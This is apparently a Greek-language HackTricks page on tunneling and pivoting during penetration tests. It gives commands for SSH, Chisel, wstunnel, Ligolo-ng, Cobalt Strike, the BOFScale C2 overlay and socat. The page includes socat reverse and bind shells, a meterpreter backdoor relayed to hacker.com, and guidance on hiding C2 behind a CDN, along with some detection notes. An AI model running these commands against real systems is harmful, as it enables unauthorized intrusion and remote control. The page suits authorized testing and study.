# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Συμβουλή για το Nmap

> [!WARNING]
> Η υποστήριξη proxy του Nmap περιορίζεται σε συνδέσεις TCP και δεν επηρεάζει τις σαρώσεις ping, θυρών ή εντοπισμού λειτουργικού συστήματος. Όταν ο scanner βρίσκεται πίσω από SOCKS proxy, **απενεργοποιήστε τον εντοπισμό host** (`-Pn`) και χρησιμοποιήστε **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Η τελική εντολή χρησιμοποιεί τις επιλογές `-u` και `-i` του Evil-WinRM για να προσδιορίσει τον λογαριασμό και τον host WinRM· η προεπιλεγμένη θύρα WinRM είναι η 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

Το OpenSSH μπορεί να προωθεί συνδέσεις X11, αυθαίρετες θύρες TCP και sockets Unix-domain μέσω του κρυπτογραφημένου καναλιού του.<sup>[[6]](#references)</sup>

Γραφική σύνδεση SSH (X)

Το `-Y` ενεργοποιεί την προώθηση αξιόπιστου X11 και το `-C` ζητά συμπίεση για τα προωθούμενα δεδομένα.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Άνοιγμα νέας θύρας στον SSH Server --> Άλλη θύρα

Η προώθηση Remote (`-R`) κάνει ακρόαση στον SSH server και συνδέεται με την τοπική πλευρά· η ρητή διεύθυνση bind καθορίζει από ποιες διεπαφές μπορεί να γίνει πρόσβαση σε αυτόν τον listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Third_box:Port

Το Local (`-L`) forwarding ακούει στον client και συνδέεται με τον προορισμό από την πλευρά του SSH server.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Οπουδήποτε

Η δυναμική προώθηση (`-D`) δημιουργεί έναν τοπικό listener SOCKS4/SOCKS5, από τον οποίο οι συνδέσεις ανοίγονται από την απομακρυσμένη πλευρά.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Πολλαπλά άλματα με ProxyJump

Το `-J`/`ProxyJump` συνδέεται στον στόχο μέσω ενός ή περισσότερων jump hosts, χωρισμένων με κόμμα. Οι επιλογές προώθησης εξακολουθούν να αφορούν την τελική σύνδεση SSH, επομένως ο παρακάτω SOCKS listener ανοίγει συνδέσεις προς προορισμούς από το `internal-target` και όχι από το πρώτο bastion. Έτσι αποφεύγεται η σύνδεση σε jump host και η εκκίνηση ενός δεύτερου SSH client εκεί.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Οι επιλογές που αφορούν συγκεκριμένους hosts για jump machines πρέπει να τοποθετούνται στο `~/.ssh/config`· η ρύθμιση της γραμμής εντολών που προορίζεται για τον προορισμό δεν εφαρμόζεται αυτόματα στους ενδιάμεσους hosts.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Αυτό είναι χρήσιμο για να λαμβάνετε reverse shells από εσωτερικούς hosts μέσω ενός DMZ στον host σας:

Η ρύθμιση `GatewayPorts` του server ελέγχει αν μια απομακρυσμένη προώθηση μπορεί να δεσμεύσει διεύθυνση πέρα από το loopback· η προεπιλεγμένη τιμή της είναι `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Αυτό το παράδειγμα, που βασίζεται σε `root`, δημιουργεί συσκευές tunnel και στους δύο hosts. Ο server πρέπει να επιτρέπει την προώθηση tun και ο επιλεγμένος λογαριασμός πρέπει να έχει πρόσβαση στη συσκευή tun· η ρύθμιση `PermitRootLogin yes` είναι ένας τρόπος χρήσης του λογαριασμού `root` εδώ.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Ενεργοποιήστε την προώθηση στην πλευρά του Server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Ορίστε μια νέα διαδρομή στην πλευρά του client.

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Ασφάλεια – Επίθεση Terrapin (CVE-2023-48795)**  
> Το OpenSSH 9.6 πρόσθεσε μια επέκταση strict-KEX για να αντιμετωπίσει την επίθεση του Terrapin στην ακεραιότητα κατά την αρχική μεταφορά. Όπου είναι δυνατό, ενημερώστε και τα δύο ομότιμα συστήματα και ακολουθήστε τις οδηγίες του προμηθευτή για παλαιότερες υλοποιήσεις, αντί να θεωρείτε ότι ένα προωθημένο κανάλι προστατεύεται μόνο λόγω της έκδοσης.<sup>[[8]](#references)</sup>

## SSHUTTLE

Μπορείτε να κάνετε **tunnel** μέσω **ssh** για όλη την **κίνηση** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, για προώθηση όλης της κίνησης που κατευθύνεται στο 10.10.10.0/24

Το `sshuttle` παρέχει διαφανή διαμεσολάβηση μέσω SSH και υποστηρίζει την επιλογή subnet και τη χρήση προσαρμοσμένης εντολής SSH, όπως φαίνεται παρακάτω.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Σύνδεση με ιδιωτικό κλειδί

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Το `portfwd` του Metasploit υποστηρίζει τοπική και απομακρυσμένη προώθηση, ενώ το SOCKS proxy module του προορίζεται να λειτουργεί με διαδρομές συνεδριών ή το `autoroute` και, σε αυτά τα παραδείγματα, ακούει από προεπιλογή στη θύρα 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (ενεργή συνεδρία) --> Third_box:Θύρα

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Ένας άλλος τρόπος:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Το Beacon του Cobalt Strike μπορεί να προωθεί συνδέσεις SOCKS4a/SOCKS5 μέσω ενός Beacon· το `rportfwd` κάνει bind στον παραβιασμένο host, ενώ το `rportfwd_local` ξεκινά τη σύνδεση προς τον προορισμό από τον client του Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Ανοίξτε μια θύρα στον Team Server στις διεπαφές που θα πρέπει να δρομολογούν την κίνηση μέσω του Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Σε αυτή την περίπτωση, η **θύρα ανοίγει στο host του Beacon**, όχι στο Team Server, και η κίνηση αποστέλλεται στο Team Server και από εκεί στον καθορισμένο host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Το εγχειρίδιο reverse forwarding αναφέρει την ακόλουθη συμπεριφορά:<sup>[[14]](#references)</sup>

- Το reverse port forward του Beacon έχει σχεδιαστεί για να **διοχετεύει την κίνηση προς τον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανημάτων**.
- Η κίνηση **διοχετεύεται μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των συνδέσεων P2P.
- Οι υψηλές θύρες συνήθως αποφεύγουν τους περιορισμούς των προνομιούχων θυρών, αλλά εξακολουθούν να ισχύουν η πολιτική του λειτουργικού συστήματος-στόχου και οι υπάρχοντες listeners.

### rPort2Port local

> [!WARNING]
> Σε αυτήν την περίπτωση, η **θύρα ανοίγει στον host του Beacon**, όχι στον Team Server, και η **κίνηση αποστέλλεται στον client του Cobalt Strike** (όχι στον Team Server) και από εκεί στον υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - tailnet εντός διεργασίας πίσω από CDN

Το [BOFScale](https://github.com/NetSPI/BOFscale) εκτελεί ένα τροποποιημένο overlay του Tailscale μέσα σε ένα Windows C2 implant, χωρίς να εγκαθιστά TUN driver ή service. Τα τρία συστατικά του είναι ένα ασύγχρονο CGo `c-shared` `tailscaled` BOF-PE, ένα μικρό C++ BOF-PE που επικοινωνεί με το local API και ένα ασύγχρονο `socksportfwd` bridge από TCP σε SOCKS5.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 και DERP συμβατά με CDN

Το Tailscale χρησιμοποιεί συνήθως ιδιόκτητα HTTP upgrades για το control channel TS2021 που βασίζεται στο Noise και για το relay DERP. Το BOFScale διατηρεί αυτά τα byte streams, αλλά τα μεταφέρει μέσω WebSockets του RFC 6455, χρησιμοποιώντας `Sec-WebSocket-Protocol: ts2021` ή `derp`, ώστε ένα origin Headscale/DERP που ελέγχει ο operator να μπορεί να βρίσκεται πίσω από CDN που δέχεται μόνο τυπικά WebSocket upgrades. Ο τροποποιημένος client επαναλαμβάνει τη σύνδεση TS2021 μέσω WebSockets μετά από HTTP `500`, επαναλαμβάνει τη σύνδεση DERP μετά από HTTP `426` και ρυθμίζει το DERP WebSocket dialer ώστε να λαμβάνει υπόψη τη ρύθμιση proxy του host· το BOF ορίζει `TS_DEBUG_DERP_WS_CLIENT=1` για να παραλείψει την πρώτη προσπάθεια, η οποία είναι γνωστό ότι αποτυγχάνει.<sup>[[53]](#references)[[54]](#references)</sup>

Το CDN και το origin proxy πρέπει να διατηρούν τα WebSocket upgrades για τα `/ts2021` και `/derp`, να προωθούν το `/key` ως συνηθισμένο HTTP και να απενεργοποιούν τα εσωτερικά read/write timeouts, επειδή οι relay sessions μπορεί να παραμένουν ανοιχτές επ' αόριστον. Η παρεχόμενη ρύθμιση του Headscale ενεργοποιεί το `verify_clients`, δημοσιεύει μόνο τον ενσωματωμένο DERP map του operator και αφήνει το `derp.urls` κενό, ώστε να αποτρέπεται η fallback σύνδεση σε relays που διαχειρίζεται το Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon εντός διεργασίας και έλεγχος μέσω named pipe

Αν δεν οριστεί διαφορετικά, το entry point του BOF εκκινεί το `tailscaled` με `-tun=userspace-networking`, `-state mem:` και `-no-logs-no-support` και, στη συνέχεια, δημιουργεί ένα pipe με όνομα UUID. Ανακατευθύνει τα stdout/stderr της Go μέσω ενός OS pipe στο Beacon output API, ώστε ολόκληρος ο daemon και το Go runtime να παραμένουν στη μνήμη, χωρίς να εγγράφονται state και logs σε κατάλογο του Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Ο ελαφρύς client αναπαράγει το local API του Tailscale μέσω HTTP/1.0 πάνω από αυτό το pipe. Ανοίγει το pipe με `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, επειδή το επίπεδο `safesocket` του daemon κάνει impersonate τον client του pipe, στέλνει `Tailscale-Cap: 125` και αντιστοιχίζει το local API στις λειτουργίες `up`, `down`, `status`, διαφήμισης route και τερματισμού.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Μην κάνετε unload ένα Go BOF-PE που έχει γίνει χειροκίνητο map αφού ζητήσετε από τον daemon να τερματιστεί: τα goroutines του runtime και του garbage collector μπορεί να συνεχίσουν να εκτελούνται από μνήμη που ο loader έχει αποχαρτογραφήσει. Εκτελέστε το `tailscaled` σε sacrificial process και τερματίστε εκείνη τη διεργασία για τον τελικό καθαρισμό.<sup>[[54]](#references)</sup>

### Δρομολόγηση της κίνησης που ξεκινά από τον host μέσω userspace SOCKS5

Οι εισερχόμενες συνδέσεις tailnet και οι διαφημιζόμενες subnet routes λειτουργούν μέσα στο userspace network stack, αλλά οι κανονικές διεργασίες του παραβιασμένου host δεν έχουν OS route προς το overlay. Γι' αυτό, το `socksportfwd` ακούει σε μια TCP port προσβάσιμη από τον victim, διαπραγματεύεται SOCKS5 `NO AUTH` με τον listener του daemon στη διεύθυνση `0.0.0.0:1080`, στέλνει `CONNECT` για έναν προορισμό του tailnet και μεταφέρει ασύγχρονα την κίνηση και προς τις δύο κατευθύνσεις. Αν ο προορισμός είναι όνομα MagicDNS, χρησιμοποιεί `ATYP_DOMAIN`, ώστε το `tailscaled` να επιλύσει το όνομα χωρίς να το εκθέσει στον Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Παρακάτω παρουσιάζεται μια ελάχιστη ροή εργασίας για τον operator· τόσο ο κόμβος του operator όσο και το implant πρέπει να χρησιμοποιούν τα τροποποιημένα binaries, επειδή το τυπικό Tailscale δεν μπορεί να λειτουργήσει μέσω αυτού του σχεδιασμού CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Το local forward μπορεί να διαχωρίσει το φαινομενικό authentication listener από το relay tool: εξαναγκάστε ένα μηχάνημα να κάνει authenticate στην bound port του compromised host, προωθήστε την κίνηση μέσω του tailnet στο `ntlmrelayx` και κάντε relay προς AD CS, LDAP, HTTP, SMB ή άλλον συμβατό στόχο. Δείτε τα [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) και [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) για τα στάδια που αφορούν τις συγκεκριμένες ευπάθειες· το BOFScale είναι μόνο το transport.<sup>[[54]](#references)</sup>

### Ανίχνευση

Αναζητήστε τον συνδυασμό ενδείξεων και όχι έναν μεμονωμένο, αδύναμο δείκτη: Go runtime σε διεργασία που κανονικά δεν βασίζεται σε Go, UUID pipe με permissive SDDL `D:(A;;GA;;;WD)`, μη αναμενόμενο SOCKS listener `0.0.0.0:1080` και TLS WebSockets μεγάλης διάρκειας προς διευθύνσεις CDN. Με TLS inspection, επισημάνετε το `Sec-WebSocket-Protocol: derp` ή `ts2021` όταν η διεργασία που τα κατέχει δεν είναι εξουσιοδοτημένη υπηρεσία `tailscaled`. Οι κανόνες `bofscale.yar` του repository παρέχουν memory signatures και για τα τρία BOF-PE components.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Το project παρέχει web tunnel endpoints όπως τα `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` και `tunnel.php`· ανεβάστε ένα υποστηριζόμενο endpoint πριν ξεκινήσετε τον local proxy.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Το Chisel μεταφέρει κίνηση TCP/UDP μέσω HTTP χρησιμοποιώντας σύνδεση προστατευμένη με SSH· χρησιμοποιήστε συμβατές εκδόσεις client/server και επαληθεύστε τη σύνταξη εντολών της επιλεγμένης έκδοσης.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Προώθηση θυρών

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

Το [`wstunnel`](https://github.com/erebe/wstunnel) μεταφέρει static ή dynamic forwards μέσω WebSocket, HTTP/2 ή WebTransport (HTTP/3 μέσω QUIC). Οι τρέχουσες εκδόσεις υποστηρίζουν TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying και Linux listeners για transparent proxy, τόσο σε forward όσο και σε reverse mode.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Εκτελέστε τον server στον attacker και ρυθμίστε το pivot να συνδέεται προς τα έξω με `-R`. Σε αυτή την κατεύθυνση, ο SOCKS5 listener δημιουργείται στον **server**, ενώ οι αιτούμενες συνδέσεις προέρχονται από το δίκτυο του **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Μια reverse static forward χρησιμοποιεί την ίδια κατεύθυνση. Για παράδειγμα, η ακόλουθη εντολή εκθέτει το `10.10.10.20:445`, όπως είναι προσβάσιμο από το pivot, στη θύρα loopback `8445` του attacker:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Λεπτομέρειες egress και transport

- Προσθέστε `-p http://user:pass@proxy:8080` στον client για να περάσετε μέσω explicit HTTP proxy. Χρησιμοποιήστε `socks5h://127.0.0.1:1080` σε clients όπως το `curl` (ή ενεργοποιήστε proxied DNS στην εφαρμογή), ώστε τα internal names να επιλύονται πέρα από το tunnel αντί να διαρρέουν στον τοπικό resolver.<sup>[[52]](#references)</sup>
- Το `wss://` επιλέγει WebSocket με προστασία TLS. Ένας client `https://` επιλέγει HTTP/2, αλλά το buffering ή η μετατροπή σε HTTP/1 από reverse proxies/CDNs συχνά διακόπτει το bidirectional stream· κατά τη δοκιμή αυτής της λειτουργίας, εκθέστε απευθείας τον server wstunnel.<sup>[[52]](#references)</sup>
- Το `wts://` επιλέγει WebTransport μέσω QUIC. Ξεκινήστε τον server με `--enable-webtransport` (ή με URL ακρόασης `wts://`) και επιτρέψτε UDP στη θύρα ακρόασης. Αυτή η λειτουργία δεν μπορεί να περάσει μέσω συμβατικού HTTP `CONNECT` proxy, επειδή αυτός ο proxy μεταφέρει TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Το upstream project προειδοποιεί να μη θεωρείτε το ενσωματωμένο self-signed certificate μέσο προστασίας του απορρήτου. Προτιμήστε έγκυρο custom certificate μαζί με `--tls-verify-certificate` (ή mTLS), διατηρήστε τους proxy listeners σε loopback εκτός αν επιδιώκετε σκόπιμα απομακρυσμένη πρόσβαση και κάντε tunnel ήδη ασφαλών protocols όταν έχει σημασία η εμπιστευτικότητα.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ο οδηγός γρήγορης εκκίνησης του Ligolo-ng περιγράφει ένα TUN interface στον proxy, επικύρωση του certificate fingerprint για τον agent και ρύθμιση route για το tunneled network.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Σύνδεση και ακρόαση στον agent

Το Ligolo-ng μπορεί να προσθέτει listeners στον agent που προωθούν την κίνηση σε μια διεύθυνση στην πλευρά του proxy, ενώ το δεσμευμένο εύρος `240.0.0.0/4` μπορεί να δρομολογηθεί για πρόσβαση σε υπηρεσίες τοπικές στον agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Πρόσβαση στις τοπικές θύρες του Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Το Rpivot ξεκινά το reverse tunnel από το θύμα και εκθέτει έναν SOCKS4 proxy στη loopback διεύθυνση του επιτιθέμενου· το README τεκμηριώνει επίσης τα διαπιστευτήρια και τις επιλογές hash για NTLM-proxy.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot μέσω **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Το Socat συνδυάζει τύπους διευθύνσεων όπως `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` και `PROXY`· τα παρακάτω παραδείγματα συνδυάζουν αυτά τα τεκμηριωμένα endpoints.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port μέσω socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter μέσω SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Μπορείτε να περάσετε μέσω ενός **μη πιστοποιημένου proxy** με τον τεκμηριωμένο τύπο διεύθυνσης PROXY του socat, εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: στον client και στον server.

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) με τη θύρα 443 του host του επιτιθέμενου.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Το Plink είναι το εργαλείο σύνδεσης γραμμής εντολών του PuTTY, με επιλογές προώθησης SSH παρόμοιες με αυτές του `ssh`.<sup>[[22]](#references)</sup>

Χρησιμοποιήστε κεφαλαίο `-P` για τη θύρα SSH. Το `-pw` διατηρείται για συμβατότητα, αλλά εκθέτει τον κωδικό πρόσβασης στη λίστα διεργασιών· όπου είναι δυνατό, προτιμήστε τον έλεγχο ταυτότητας με κλειδί ή το `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Καθώς αυτό το δυαδικό αρχείο θα εκτελεστεί στο θύμα και είναι SSH client, ανοίξτε την υπηρεσία SSH και τη θύρα για την αντίστροφη σύνδεση· το παρακάτω χρησιμοποιεί το `-R` για να προωθήσει μια τοπικά προσβάσιμη θύρα στο μηχάνημα του επιτιθέμενου.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Χρησιμοποιήστε ένα context με τα απαιτούμενα δικαιώματα του host όταν δημιουργείτε ή αλλάζετε μόνιμους κανόνες `portproxy`. Η Microsoft τεκμηριώνει τις μορφές προσθήκης, εμφάνισης και διαγραφής `v4tov4` που χρησιμοποιούνται παρακάτω.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Ανάπτυξη του `portproxy` μέσω προγραμματισμένης εργασίας

